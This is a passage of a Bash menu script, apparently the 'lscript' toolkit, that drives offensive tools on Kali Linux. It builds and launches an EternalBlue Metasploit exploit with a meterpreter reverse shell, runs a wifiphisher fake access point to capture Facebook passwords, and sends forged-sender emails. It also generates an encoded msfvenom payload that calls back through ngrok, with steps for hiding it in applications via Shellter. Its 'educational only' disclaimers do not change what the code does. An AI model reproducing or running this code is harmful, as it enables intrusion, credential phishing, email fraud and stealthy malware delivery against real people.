		if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
		then
			NAMERC="$NAMERC".rc
			if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
			then
				echo -e "File not found. Try again.."
				sleep 2
				continue
			fi
		fi
		while true
		do
		clear
		echo -e ""$NAMERC" selected."
		echo -e ""$YS" 1"$CE") Start listener"
		echo -e ""$YS" 2"$CE") Delete listener"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read LISTL
		if [[ "$LISTL" = "1" ]]
		then
			msfconsole -r "$LPATH"/rc/"$NAMERC"
		elif [[ "$LISTL" = "2" ]]
		then
			rm "$LPATH"/rc/"$NAMERC"
			break
		elif [[ "$LISTL" = "back" || "$LISTL" = "b" ]]
		then
			break
		fi
		done
		done
	elif [[ "$METASP" = "4" ]]
	then
		msfconsole
	elif [[ "$METASP" = "5" ]]
	then
		msfupdate
	elif [[ "$METASP" = "6" ]]
	then
		service postgresql start
		armitage
		clear
	elif [[ "$METASP" = "back" || "$METASP" = "b" ]]
	then
		BACKL="1"
		break
	elif [[ "$METASP" = "00" ]]
	then
		exec bash "$0"
	elif [[ "$METASP" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function update_lscript
{
	echo -e "Checking for updates..."
	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
	if [[ "$TESTINTERNETCONNECTION" != "" ]]
	then
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [[ "$VERSION" != "$VER" ]]
		then
		clear
		echo -e "There is an update available."
		echo -e "Current version: $VERSION"
		echo -e "Updated version: $VER"
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Do you want to update?"$YNONLY": "
		read UPDATEYN
		if [[ "$UPDATEYN" = "y" ]]
		then
			clear
			echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
			sleep 2
			mkdir /root/lscriptold
			echo -e ""
			echo -e "Moving lscript to lscriptold"
			sleep 2
			mv "$LPATH" /root/lscriptold
			echo -e "Cloning the latest github version to new "$LPATH""
			sleep 2
			cd
			git clone https://github.com/arismelachroinos/lscript.git
			cd "$LPATH"
			chmod +x install.sh
			clear
			if [[ -d /root/lscriptold/lscript/ks ]]
			then
				cp /root/lscriptold/lscript/ks "$LPATH"
			fi
			echo -e "Ok , everything seems to be fine by now."
			sleep 1
			echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
			echo -e ""
			sleep 4
			echo -e "$PAKTC"
			$READAK
			cd "$LPATH"
			gnome-terminal -e ./install.sh
			clear 
			if [[ -d /root/lscriptold/ks ]]
			then
				echo -e "Copying old shortcuts"
				cp /root/lscriptold/ks "$LPATH"
				sleep 1
				echo -e "Done."
				sleep 1
				clear
			fi
			sleep 1
			echo -e ""
			echo -e "Removing old lscript"
			rm -rf /root/lscriptold
			echo -e "Exiting..."
			sleep 1
			exit
		else 
			clear
			echo -e "You didnt select "y" so you go back..."
			sleep 3
			exec bash "$0"
		fi
		else
		echo -e "There is no update available"
		sleep 1
		echo -e "Installed version: $VERSION"
		sleep 1
		echo -e "Github version:    $VER"
		sleep 1
		echo -e "$PAKTGB"
		$READAK	
		exec bash "$0"
		fi
	else
		clear
		echo -e "There is no connection."
		sleep 1
		echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi	
}
function hidden_shortcuts
{
	clear
	TERMINALTITLE="HIDDEN SHORTCUTS"
	dash_calc
	printf '\033]2;HIDDEN SHORTCUTS\a'
	echo -e ""$YS"  interface"$CE") Change your interface"
	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
	echo -e ""$YS"  etercheck"$CE") Check if a target is vulnerable to eternalblue exploit"
	echo -e ""$YS"  changelog"$CE") View the changelog of the lscript versions"
	echo -e ""$YS"     pstart"$CE") Service postgresql start"
	echo -e ""$YS"      pstop"$CE") Service postgresql stop"
	echo -e ""$YS"     nstart"$CE") Service network-manager start"
	echo -e ""$YS"      nstop"$CE") Service network-manager stop"
	echo -e ""$YS"     astart"$CE") Service apache2 start"
	echo -e ""$YS"      astop"$CE") Service apache2 stop"
	echo -e ""$YS"nessusstart"$CE") Start Nessus"
	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
	echo -e "$PAKTGB"
	$READAK
	clear
}
function one_time_per_launch_ks
{
	if [[ -d ""$KSPATH"/nums" ]]
	then
		rm -r "$KSPATH"/nums
	fi
	mkdir "$KSPATH"/nums
	nn=1
	ff=1
	HOWMANY=0
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [[ "$nn" != "$HOWADD" ]]
	do
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
}
function interface_menu
{
	WLANN=$(cat "$LPATH"/wlan.txt)
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
	sleep 2
	echo -e "Do you want to change you interface names?"$YNYES": "
	read INAG
	if [[ "$INAG" = "n" ]]
	then
		clear
		echo -e "Then why did you come here? lol"
		sleep 3
		exec bash "$0"
	else
		clear
		rm "$LPATH"/wlan.txt
		rm "$LPATH"/wlanmon.txt
		set_interface_number
	fi
}
function tools_menu
{
	while true
	do
	TERMINALTITLE="TOOLS"
	dash_calc
	printf '\033]2;TOOLS\a'
	echo -e ""$YS" 1"$CE") Wifi tools"
	echo -e ""$YS" 2"$CE") Remote access"
	echo -e ""$YS" 3"$CE") Information gathering"
	echo -e ""$YS" 4"$CE") Others"
	echo -e ""$YS" 5"$CE") Install/reinstall a tool"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e CATEG
	clear
		if [[ "$CATEG" = "1" ]]
		then
			wifi_tools
		elif [[ "$CATEG" = "2" ]]
		then
			remote_access
		elif [[ "$CATEG" = "3" ]]
		then
			information_gathering
		elif [[ "$CATEG" = "4" ]]
		then
			other_tools
		elif [[ "$CATEG" = "5" ]]
		then
			reinstall_tools
		elif [[ "$CATEG" = "0" ]]
		then
			clear
			exit
		elif [[ "$CATEG" = "back" || "$CATEG" = "b" ]]
		then
			BACKL="1"
			break
		elif [[ "$CATEG" = "00" ]]
		then
			clear
			exec bash "$0"
		fi
	done
}
function public_ip
{
	clear
	CHECKMON=$(ifconfig | grep "mon")
	if [[ "$CHECKMON" = "" ]]
	then
		PUBLICIP=$(curl -s ipinfo.io/ip)
		if [[ "$PUBLICIP" = "" ]]
		then
			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
			if [[ "$PUBLICIP" = "" ]]
			then
				PUBLICIP="Connection error."
			fi
		fi
		echo "Your public IP is: "$PUBLICIP""
		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	else
		echo -e "When monitor mode is enabled, you don't have internet access."
		echo -e "Select 'd2' to disable monitor mode"
		echo -e "$PAKTGB"
		$READAK
		clear
		exec bash "$0"
	fi
}
function terms_of_use
{
	printf '\033]2;TERMS OF USE\a'
	clear
	echo -e ""$RS"You need to accept the terms."$CE""
	sleep 1
	echo -e "$PAKTC"
	$READAK
	clear
	echo -e "This tool is only for educational purposes only."
	sleep 2
	echo -e "Use this tool only on your own network and never without permission."
	sleep 2
	echo -e "I am not responsible for anything you do with this tool."
	sleep 2
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [[ "$YESORNO" = "YES" ]]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	else
		echo -e "You didn't type 'YES' , so you cannot continue"
		sleep 4
	fi
	exec bash "$0"
}
function eternalblue
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "LHOST: "
	read LHOSTL
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
	read TARGETARCHL
	if [[ "$TARGETARCHL" = "x64" ]]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function eternalblue_check
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "RHOST: "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function start_menu
{
	O1=0
	O2=0
	O3=0
	enable_wlan
	echo -e "Enabling $WLANNM..."
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Done"$CE"" && O1=1
	echo -e "Starting monitor mode..."
	airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
	ifconfig $WLANNM down
	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_menu
{
	O1=0
	O2=0
	O3=0
	stop_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Done"$CE""
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
	echo -e "Starting network-manager service..."
	service network-manager start && echo -e ""$YS"Done"$CE"" && O3=1 || echo -e ""$RS"Error starting network-manager service"$CE""
}
function spoof_email
{
while true
do
	sm=0
	clear
	if [[ ! -d /bin/lscript/smtp ]]
	then
		mkdir /bin/lscript/smtp
	fi
	echo -e ""$RS"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL."$CE""
	echo -e ""$RS"THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS."$CE""
	echo -e ""$RS"      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########"$CE""
	echo -e ""$RS"      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########"$CE""
	if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
	then
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     "$RS"NOT SET"$CE""
	else
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     Current: "$YS""$smtpemail""$CE""
	fi
	echo -e ""$YS" 2"$CE") Send a spoofed email"
	echo -e ""$YS" 3"$CE") Clear your SMTP username and pass from lscript"
	echo -e ""$YS" 4"$CE") Fix email failed"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	read SMTP
	if [[ "$SMTP" = "1" ]]
	then
		clear
		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
		echo -e "Credentials saved on /bin/lscript/smtp"
		sleep 3
	elif [[ "$SMTP" = "4" ]]
	then
		clear	
		echo -e "If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [[ "$SMTP" = "3" ]]
	then
		if [[ -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			rm /bin/lscript/smtp/smtpemail.txt
			echo -e "Username removed"
		else
			echo -e "Not username found"
		fi
		if [[ -f /bin/lscript/smtp/smtppass.txt ]]
		then
			rm /bin/lscript/smtp/smtppass.txt
			echo -e "Password removed"
		else
			echo -e "Not password found"
		fi
		sleep 2
		continue
	elif [[ "$SMTP" = "0" ]]
	then
		clear
		exit
	elif [[ "$SMTP" = "back" || "$SMTP" = "b" ]]
	then
		clear
		break
	elif [[ "$SMTP" = "2" ]]
	then
		while true
		do
		clear
		if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			echo -e "No smtp username found."
			sm=1
		fi
		if [[ ! -f /bin/lscript/smtp/smtppass.txt ]]
		then
			echo -e "No smtp pass found."
			sm=1
		fi
		if [[ "$sm" = 1 ]]
		then
			break
		fi
		read smtppass < /bin/lscript/smtp/smtppass.txt
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		clear
		echo -e "Your username is "$RS""$smtpemail""$CE""
		echo -e ""
		echo -e "Enter the target's email: "
		read TARGETSEMAIL
		echo -e "Enter the email that you want the target to see: "
		read SPOOFEDEMAIL
		echo -e "Enter the subject of the message: "
		read SUBJECTEMAIL
		echo -e "Enter the message: "
		read MESSAGEEMAIL
		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
		read SMTPSERVER
		if [[ "$SMTPSERVER" = "" ]]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
		read SMTPPORT
		if [[ "$SMTPPORT" = "" ]]
		then
			SMTPPORT="2525"
		fi
		echo -e "Press "$YS"enter"$CE" to send the message to "$TARGETSEMAIL""
		read 
		clear
		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}
function new_terminal
{
		while true
		do
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [[ "$CHECKMON" = "" ]]
		then
			echo -e "Monitor mode is not enabled."
			echo -e ""
			echo -e "Do you want to enable monitor mode? "$YNYES": "
			read MONITOREN
			clear
			if [[ "$MONITOREN" = "n" ]]
			then
			#~ echo -e "Select 'start' or '2' to enable it"
				echo -e "$PAKTGB"
				$READAK
				clear
				exec bash "$0"
			else
				start_menu
				continue
			fi
		else
			if [[ "$YORNAA" = "10" ]]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				FJC=0
				export FJC
				gnome-terminal --geometry 87x35+9999+0 -e lh1
				sleep 1
				exec bash "$0"
				break
			elif [[ "$YORNAA" = "11" ]]
			then
				clear
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -e lh3
				sleep 1
				exec bash "$0"
				break
			elif [[ "$YORNAA" = "12" ]]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -e lh4
				sleep 1
				exec bash "$0"
				break
			fi
		fi
		done
}
function check_if_ks
{
	while [ $var1 -le $HOWMANY ]
	do
		read TITLE < "$KSPATH"/nums/"$var1".txt
		read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		if [[ "$YORNAA" = "$YORNAKS" ]]
		then
			read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
			read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
			$COMMAND1
			#~ if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]]
			#~ then
				#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
				#~ $COMMAND3
			#~ fi
			$COMMAND2
			BACKL="1"
		fi
		var1=$(( var1+1 ))
	done
}
function wififb
{
	echo -e "Enter the name of the access point you want to create: "
	read -e ESSIDAP
	export ESSIDAP
	xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
}
function donate_option
{
	while true
	do
	clear
	TERMINALTITLE="DONATION"
	dash_calc
	printf '\033]2;DONATION\a'
	echo -e "If you found my script useful, you can buy me a coffee :)"
	echo -e "Total lscript donations: $DONATIONS"
	echo -e ""$YS" 1"$CE") Open browser to donate"
	echo -e ""$YS" 2"$CE") Copy donation link"
	echo -e ""$YS" b"$CE") I don't care about your work! :P"
	echo -e "Choose: "
	read DON
	if [[ "$DON" = "1" ]]
	then
		xdg-open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
	elif [[ "$DON" = "2" ]]
	then
		echo -e "Donation link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$DON" = "back" || "$DON" = "b" ]]
	then
		break
	fi
	done
}
function ngrok_option
{
	while true
	do
		clear
		if [[ -f /root/ngrok ]]
		then
			TERMINALTITLE="NGROK"
			dash_calc
			printf '\033]2;NGROK\a'
			echo -e ""$YS"help"$CE") How to make it work?"
			echo -e ""$YS" 1"$CE") Open a tcp port"
			echo -e ""$YS" 2"$CE") Open a tls port"
			echo -e ""$YS" 3"$CE") Open a http port"
			echo -e ""$YS" 4"$CE") Intergrate with Shellter"
			echo -e ""$YS" 5"$CE") Set your ngrok authtoken"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read NG
			clear
			if [[ "$NG" = "help" || "$NG" = "h" ]]
			then
				echo -e "With ngrok, you can port forward without router intergration."
				echo -e "It is free, HOWEVER:"
				echo -e "---to open a tcp port, you need to sign up (it's too easy)"
				echo -e "   Go to https://ngrok.com and choose "$YS"sign up"$CE"."
				echo -e "   When that's done, copy the given "$YS"authtoken"$CE"."
				echo -e "   (If you can't find it go to: https://dashboard.ngrok.com/auth )"
				echo -e "   Then select the 'set your authtoken' option in lscript, and paste it."
				echo -e "---to make a reverse tcp payload:"
				echo -e "   You need to set the payload to: windows/meterpreter/reverse_tcp_dns"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$NG" = 1 || "$NG" = 2 || "$NG" = 3 ]]
			then
				echo -e "Type the local port to forward: "
				read PORTL
				if [[ "$NG" = 1 ]]
				then
					PROT="tcp"
				elif [[ "$NG" = 2 ]]
				then
					PROT="tls"
				else
					PROT="http"
				fi
				export PORTL
				export PROT
				xterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown
			elif [[ "$NG" = 4 ]]
			then
				while true
				do
					clear
					echo -e ""$YS" 1"$CE") Make a raw tcp payload for Shellter"
					echo -e ""$YS" 2"$CE") How to intergrate it"
					echo -e ""$YS" b"$CE") Go back"
					echo -e "Choose:"
					read SHINT
					clear
					if [[ "$SHINT" = 1 ]]
					then
						while true
						do
							if [[ "$NGPORT" = "" ]]
							then
								NGPORT="\e[1;31mNONE\e[0m"
							fi
							clear
							echo -e ""$YS" 1"$CE") Set the Ngrok tcp port              CURRENT:"$NGPORT""
							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
							echo -e ""$YS" b"$CE") Go back"
							echo -e ""$YS"run"$CE") Make the payload"
							echo -e "Choose: "
							read RP
							if [[ "$RP" = 1 ]]
							then
								echo -e "Ngrok port: "
								read NGPORT
							elif [[ "$RP" = "back" || "$RP" = "b" ]]
							then
								break
							elif [[ "$RP" = "run" ]]
							then
								RAW=rawfud
								NUMB=1
								while true
								do
									RAWN=""$RAW""$NUMB""
									if [[ -f /root/Desktop/"$RAWN".raw ]]
									then
										NUMB=$((NUMB+1))
									else
										break
									fi
								done
								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
								sleep 2
								if [[ -f /root/Desktop/"$RAWN".raw ]]
								then
									clear
									echo -e "Payload was saved to /root/Desktop/"$RAWN".raw"
								fi
								echo -e "$PAKTGB"
								$READAK
							fi
						done
					elif [[ "$SHINT" = 2 ]]
					then
						echo -e "First you should make a raw payload with option 1."
						echo -e "Then open shellter and select your app to be injected."
						echo -e "Then, on stealth mode select y."
						echo -e "Select to type a custom payload, NOT listed."
						echo -e "Then type the path of the payload you have created on option 1."
						echo -e "For the listener, the payload is windows/meterpreter/reverse_tcp_dns"
						echo -e "LHOST is 127.0.0.1 and LPORT is the port you opened to ngrok."
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$SHINT" = "back" || "$SHINT" = "b" ]]
					then
						break
					fi
				done
			elif [[ "$NG" = "back" || "$NG" = "b" ]]
			then
				clear
				break
			elif [[ "$NG" = 5 ]]
			then
					echo -e "Type your authtoken: "
					read AUTHT
					if [[ "$AUTHT" != "" ]]
					then
						./ngrok authtoken $AUTHT
						echo -e "$PAKTGB"
						$READAK
					fi
			fi
		else
			echo -e ""$RS"Ngrok is not installed.To install it, go to TOOLS -> Install/reinstall a tool -> ngrok"$CE""
			echo -e "$PAKTGB"
			$READAK
		fi
	done
}
function settings_menu
{
	if [[ ! -d "$LPATH"/settings ]]
	then
		mkdir "$LPATH"/settings 
	fi
	clear
	while true
	do
		clear
		TERMINALTITLE="SETTINGS"
		dash_calc
		printf '\033]2;SETTINGS\a'
		echo -e ""$YS" 1"$CE") Nothing here yet."
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS" 0"$CE") Exit"
		read SET
		if [[ "$SET" = "back" || "$SET" = "b" ]]
		then
			BACKL=1
			break
		elif [[ "$SET" = 0 ]]
		then
			clear
			exit
		#~ elif [[ "$SET" = 1 ]]
		#~ then
				#~ if [[ -f "$LPATH"/settings/auto-update.txt ]]
				#~ then
					#~ read AUTOUPADATE < "$LPATH"/settings/auto-update.txt
				#~ fi
				#~ if [[ "$AUTOUPDATE" = "" ]]
				#~ then
					#~ AUTOUPDATE=0
				#~ fi
				#~ echo -e ""$RS"This will delay the script's launch time "
				#~ echo -e "Set the interval(Current:"$AUTOUPDATE"):"
				
		fi
	done
}
function main_options
{
	if [[ "$YORNAA" = "0" ]]
	then
		exit
	elif [[ "$YORNAA" = "settings" ]]
	then
		settings_menu
	elif [[ "$YORNAA" = "16" ]]
	then
		ngrok_option
		BACKL=1
	elif [[ "$YORNAA" = "donate" ]]
	then
		donate_option
	elif [[ "$YORNAA" = "pstart" ]]
	then
		service postgresql start
	elif [[ "$YORNAA" = "pstop" ]]
	then
		service postgresql stop
	elif [[ "$YORNAA" = "nstart" ]]
	then
		service network-manager start
	elif [[ "$YORNAA" = "nstop" ]]
	then
		service network-manager stop
	elif [[ "$YORNAA" = "astart" ]]
	then
		service apache2 start
	elif [[ "$YORNAA" = "astop" ]]
	then
		service apache2 stop
	elif [[ "$YORNAA" = "nessusstart" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd start
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
	elif [[ "$YORNAA" = "nessusstop" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd stop
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
	elif [[ "$YORNAA" = "15" ]]
	then
		BACKL="1"
		spoof_email
	elif [[ "$YORNAA" = "ks" ]]
	then
		keyboard_shortcuts
	elif [[ "$YORNAA" = "interface" ]]
	then
		interface_menu
	elif [[ "$YORNAA" = "9" ]]
	then
		tools_menu
	elif [[ "$YORNAA" = "l" ]]
	then
		clear 
		exec bash "$0"
	elif [[ "$YORNAA" = "clear" ]]
	then
		echo -e "Ok.I can clear for you..."
		sleep 1
		clear
		exec bash "$0"
	elif [[ "$YORNAA" = "gg" ]]
	then
		geany /bin/lscript/l
	elif [[ "$YORNAA" = "1" ]]
	then
		enable_wlan
	elif [[ "$YORNAA" = "d1" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface to disable."$CE""
		else
			disable_wlan
		fi
	elif [[ "$YORNAA" = "2" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface."$CE""
		else
			echo -e "Enabling $WLANNM..."
			echo -e "Killing services..."
			(airmon-ng check kill &> /dev/null && echo -e "Done." ) || echo -e ""$RS"Error killing services"$YS""
			echo -e "Starting monitor mode..."
			(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
		fi
	elif [[ "$YORNAA" = "d2" ]]
	then
		check_wlans
		if [[ "$WLANMCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANNM interface."$CE""
		else
			stop_monitor
		fi
		#~ echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
		#~ read -e YORN
		#~ if [[ "$YORN" = "y" ]] 
		#~ then
			#~ #rfkill unblock wifi
			#~ #rfkill unblock all
			#~ ifconfig $WLANN down
			#~ echo -e "$WLANN is now down."
		#~ fi
	elif [[ "$YORNAA" = "3" ]]
	then
		change_mac
	elif [[ "$YORNAA" = "d3" ]]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [[ "$YORNAA" = "4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Enabling anonym8..."
			anonym8 start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Disabling anonym8..."
			anonym8 stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Enabling anonsurf..."
			anonsurf start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Disabling anonsurf..."
			anonsurf stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Status of anonsurf..."
			anonsurf status
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonsurf change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "r6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
